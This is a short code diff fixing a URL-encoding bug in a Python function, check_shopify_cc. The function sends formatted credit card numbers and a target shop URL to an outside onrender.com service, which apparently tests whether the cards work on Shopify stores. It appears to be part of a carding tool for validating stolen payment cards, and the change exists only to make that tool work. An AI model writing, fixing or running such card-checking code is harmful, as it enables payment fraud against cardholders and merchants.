@@ -2368,7 +2368,7 @@ def check_shopify_cc(cc, site_info):
             pass
 
         # Make API request
-        api_url = f"https://auto-shopify-6cz4.onrender.com/index.php?site={site_info[%27url%27]}&cc={formatted_cc}"
+        api_url = f"https://auto-shopify-6cz4.onrender.com/index.php?site={site_info['url']}&cc={formatted_cc}"
         response = requests.get(api_url, timeout=100)
         
         if response.status_code != 200:
